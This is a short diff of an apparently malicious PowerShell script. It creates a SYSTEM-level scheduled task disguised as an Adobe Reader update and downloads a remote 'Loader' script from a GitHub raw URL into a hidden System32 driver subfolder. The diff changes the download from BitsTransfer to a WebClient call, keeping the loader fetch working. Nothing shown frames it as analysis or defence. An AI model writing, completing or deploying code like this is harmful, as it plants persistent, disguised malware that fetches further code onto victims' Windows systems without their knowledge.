@@ -52,5 +52,5 @@ SCHTASKS /Create /RU "SYSTEM" /tn "AdobeReaderUpdateEnd" /sc Daily /st 06:10:00 
 # Download Loader
 $url2 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/Line.ps1"
 $output2 = "C:\Windows\System32\drivers\en-US\etc\Line.ps1"
-Import-Module BitsTransfer
-Start-BitsTransfer -Source $url2 -Destination $output2
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url2, $output2)
